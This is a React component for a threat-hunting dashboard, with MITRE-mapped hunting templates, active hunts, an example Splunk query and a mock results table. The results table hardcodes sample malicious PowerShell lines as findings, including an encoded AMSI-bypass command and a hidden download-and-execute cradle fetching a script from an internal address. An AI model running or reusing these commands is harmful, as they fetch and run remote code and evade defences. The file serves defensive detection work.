
import React from 'react';
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Badge } from '@/components/ui/badge';
import { Separator } from '@/components/ui/separator';
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
import { Search, Calendar, Filter, Clock, PlayCircle, Save, BookOpen, Code, FileText } from 'lucide-react';
import { Input } from '@/components/ui/input';
import { 
  Table, 
  TableBody, 
  TableCell, 
  TableHead, 
  TableHeader, 
  TableRow 
} from '@/components/ui/table';

const huntingTemplates = [
  {
    id: '1',
    name: 'PowerShell Command Line Detection',
    description: 'Detects suspicious PowerShell command line parameters',
    mitreTactic: 'Execution',
    mitreTechnique: 'Command and Scripting Interpreter: PowerShell (T1059.001)',
    category: 'Windows',
    lastRun: '2 days ago',
    creator: 'Security Team'
  },
  {
    id: '2',
    name: 'DNS Tunneling Detection',
    description: 'Identifies potential DNS tunneling through abnormal request patterns',
    mitreTactic: 'Command and Control',
    mitreTechnique: 'Application Layer Protocol: DNS (T1071.004)',
    category: 'Network',
    lastRun: '5 days ago',
    creator: 'John Smith'
  },
  {
    id: '3',
    name: 'Suspicious Registry Modifications',
    description: 'Detects modifications to autorun registry keys',
    mitreTactic: 'Persistence',
    mitreTechnique: 'Boot or Logon Autostart Execution: Registry Run Keys (T1547.001)',
    category: 'Windows',
    lastRun: 'Never',
    creator: 'Security Team'
  },
  {
    id: '4',
    name: 'Living Off The Land Binary Usage',
    description: 'Identifies the use of native Windows utilities for malicious purposes',
    mitreTactic: 'Defense Evasion',
    mitreTechnique: 'System Binary Proxy Execution (T1218)',
    category: 'Windows',
    lastRun: '1 week ago',
    creator: 'Sarah Lee'
  },
  {
    id: '5',
    name: 'Data Exfiltration Over Web Protocol',
    description: 'Detects large volume data transfers to external destinations',
    mitreTactic: 'Exfiltration',
    mitreTechnique: 'Exfiltration Over Web Service (T1567)',
    category: 'Network',
    lastRun: '3 days ago',
    creator: 'Mike Chen'
  }
];

const activeHunts = [
  {
    id: '101',
    name: 'PowerShell Obfuscation Detection',
    status: 'Running',
    progress: 65,
    startTime: '2 hours ago',
    foundCount: 3
  },
  {
    id: '102',
    name: 'Unusual Service Creation',
    status: 'Completed',
    progress: 100,
    startTime: '5 hours ago',
    foundCount: 0
  }
];

const exampleQuery = `
index=windows sourcetype=WinEventLog:Security EventCode=4688 
| rex field=CommandLine "(?<process_name>[^\\\\/]+)$" 
| stats count dc(CommandLine) as unique_cmd_count by process_name, Computer 
| lookup legitimate_processes.csv process_name 
| where is_legitimate=1 AND unique_cmd_count > 20 
| sort -unique_cmd_count 
| rename process_name as "Process", Computer as "Endpoint", unique_cmd_count as "Unique Command Count"
`;

export const ThreatHunting = () => {
  return (
    <div className="space-y-6">
      <Tabs defaultValue="templates" className="w-full">
        <TabsList>
          <TabsTrigger value="templates">Hunting Templates</TabsTrigger>
          <TabsTrigger value="active">Active Hunts</TabsTrigger>
          <TabsTrigger value="custom">Custom Query</TabsTrigger>
          <TabsTrigger value="results">Results</TabsTrigger>
        </TabsList>
        
        <TabsContent value="templates" className="space-y-6 mt-6">
          {/* Search and Filter */}
          <div className="flex gap-4">
            <div className="relative flex-1">
              <Search className="absolute left-2.5 top-2.5 h-4 w-4 text-muted-foreground" />
              <Input placeholder="Search templates by name, description, or MITRE technique" className="pl-8" />
            </div>
            <Button variant="outline">
              <Filter className="mr-2 h-4 w-4" /> Filter
            </Button>
            <Button variant="outline">
              <Calendar className="mr-2 h-4 w-4" /> Time Range
            </Button>
          </div>
          
          {/* Templates List */}
          <Card>
            <CardHeader>
              <CardTitle>Hunting Templates</CardTitle>
              <CardDescription>Pre-configured queries for common threat hunting scenarios</CardDescription>
            </CardHeader>
            <CardContent>
              <Table>
                <TableHeader>
                  <TableRow>
                    <TableHead>Name</TableHead>
                    <TableHead>MITRE Technique</TableHead>
                    <TableHead>Category</TableHead>
                    <TableHead>Last Run</TableHead>
                    <TableHead>Actions</TableHead>
                  </TableRow>
                </TableHeader>
                <TableBody>
                  {huntingTemplates.map((template) => (
                    <TableRow key={template.id}>
                      <TableCell>
                        <div className="font-medium">{template.name}</div>
                        <div className="text-sm text-muted-foreground">{template.description}</div>
                      </TableCell>
                      <TableCell>
                        <div className="flex flex-col">
                          <Badge variant="outline" className="mb-1 w-fit">{template.mitreTactic}</Badge>
                          <span className="text-xs">{template.mitreTechnique}</span>
                        </div>
                      </TableCell>
                      <TableCell>{template.category}</TableCell>
                      <TableCell>{template.lastRun}</TableCell>
                      <TableCell>
                        <div className="flex space-x-2">
                          <Button size="sm" variant="default">
                            <PlayCircle className="mr-1 h-3 w-3" /> Run Hunt
                          </Button>
                          <Button size="sm" variant="outline">
                            <Code className="mr-1 h-3 w-3" /> View SPL
                          </Button>
                        </div>
                      </TableCell>
                    </TableRow>
                  ))}
                </TableBody>
              </Table>
            </CardContent>
          </Card>
        </TabsContent>
        
        <TabsContent value="active" className="space-y-6 mt-6">
          <Card>
            <CardHeader>
              <CardTitle>Active Hunts</CardTitle>
              <CardDescription>Currently running and recently completed hunting queries</CardDescription>
            </CardHeader>
            <CardContent>
              {activeHunts.map((hunt) => (
                <div key={hunt.id} className="mb-4 p-4 border rounded-lg">
                  <div className="flex justify-between items-start">
                    <div>
                      <h3 className="font-medium">{hunt.name}</h3>
                      <div className="flex items-center text-sm text-muted-foreground">
                        <Clock className="mr-1 h-3 w-3" /> Started {hunt.startTime}
                      </div>
                    </div>
                    <Badge variant={hunt.status === 'Running' ? 'default' : 'outline'}>
                      {hunt.status}
                    </Badge>
                  </div>
                  
                  <div className="mt-4">
                    <div className="flex justify-between text-sm mb-1">
                      <span>Progress: {hunt.progress}%</span>
                      <span>Findings: {hunt.foundCount}</span>
                    </div>
                    <div className="w-full bg-gray-200 rounded-full h-2.5">
                      <div 
                        className="bg-blue-600 h-2.5 rounded-full" 
                        style={{ width: `${hunt.progress}%` }}
                      ></div>
                    </div>
                  </div>
                  
                  <div className="mt-4 flex space-x-2">
                    {hunt.status === 'Running' ? (
                      <Button size="sm" variant="destructive">
                        Stop Hunt
                      </Button>
                    ) : (
                      <Button size="sm" variant="default">
                        View Results
                      </Button>
                    )}
                    <Button size="sm" variant="outline">
                      <FileText className="mr-1 h-3 w-3" /> Create Report
                    </Button>
                  </div>
                </div>
              ))}
            </CardContent>
          </Card>
        </TabsContent>
        
        <TabsContent value="custom" className="space-y-6 mt-6">
          <Card>
            <CardHeader>
              <CardTitle>Custom SPL Query</CardTitle>
              <CardDescription>Create and run a custom Splunk Processing Language query</CardDescription>
            </CardHeader>
            <CardContent>
              <div className="space-y-4">
                <div>
                  <label className="block text-sm font-medium mb-1">Query Name</label>
                  <Input placeholder="Enter a descriptive name for your query" />
                </div>
                
                <div>
                  <label className="block text-sm font-medium mb-1">SPL Query</label>
                  <div className="font-mono text-sm bg-gray-50 p-4 rounded-md border min-h-40 whitespace-pre-wrap">
                    {exampleQuery}
                  </div>
                </div>
                
                <div className="flex justify-between items-center">
                  <div className="flex space-x-2">
                    <Button variant="outline">
                      <Calendar className="mr-1 h-4 w-4" /> Time Range
                    </Button>
                    <Button variant="outline">
                      <BookOpen className="mr-1 h-4 w-4" /> Query Library
                    </Button>
                  </div>
                  
                  <div className="flex space-x-2">
                    <Button variant="outline">
                      <Save className="mr-1 h-4 w-4" /> Save
                    </Button>
                    <Button variant="default">
                      <PlayCircle className="mr-1 h-4 w-4" /> Run Query
                    </Button>
                  </div>
                </div>
              </div>
            </CardContent>
          </Card>
        </TabsContent>
        
        <TabsContent value="results" className="space-y-6 mt-6">
          <Card>
            <CardHeader>
              <CardTitle>Hunt Results</CardTitle>
              <CardDescription>Results from the PowerShell Obfuscation Detection hunt</CardDescription>
            </CardHeader>
            <CardContent>
              <Table>
                <TableHeader>
                  <TableRow>
                    <TableHead>Timestamp</TableHead>
                    <TableHead>Hostname</TableHead>
                    <TableHead>Process</TableHead>
                    <TableHead>User</TableHead>
                    <TableHead>Command Line</TableHead>
                    <TableHead>Risk Score</TableHead>
                  </TableRow>
                </TableHeader>
                <TableBody>
                  <TableRow>
                    <TableCell>2025-05-14 10:23:45</TableCell>
                    <TableCell>DESKTOP-8RV3J4F</TableCell>
                    <TableCell>powershell.exe</TableCell>
                    <TableCell>jsmith</TableCell>
                    <TableCell className="font-mono text-xs">powershell.exe -enc YQBtAHMAaQAgAGIAeQBwAGEAcwBzAA==</TableCell>
                    <TableCell><Badge className="bg-red-500 text-white">High</Badge></TableCell>
                  </TableRow>
                  <TableRow>
                    <TableCell>2025-05-14 10:25:12</TableCell>
                    <TableCell>DESKTOP-8RV3J4F</TableCell>
                    <TableCell>powershell.exe</TableCell>
                    <TableCell>jsmith</TableCell>
                    <TableCell className="font-mono text-xs">powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command "Invoke-Expression"</TableCell>
                    <TableCell><Badge className="bg-red-500 text-white">High</Badge></TableCell>
                  </TableRow>
                  <TableRow>
                    <TableCell>2025-05-14 11:12:03</TableCell>
                    <TableCell>SRV-ACCT-01</TableCell>
                    <TableCell>powershell.exe</TableCell>
                    <TableCell>system</TableCell>
                    <TableCell className="font-mono text-xs">powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.0.0.8/script.ps1'))"</TableCell>
                    <TableCell><Badge className="bg-red-500 text-white">Critical</Badge></TableCell>
                  </TableRow>
                </TableBody>
              </Table>
              
              <Separator className="my-4" />
              
              <div className="flex justify-between">
                <Button variant="outline">
                  <FileText className="mr-1 h-4 w-4" /> Export Results
                </Button>
                <div className="flex space-x-2">
                  <Button variant="outline">Create Case</Button>
                  <Button variant="default">Take Action</Button>
                </div>
              </div>
            </CardContent>
          </Card>
        </TabsContent>
      </Tabs>
    </div>
  );
};
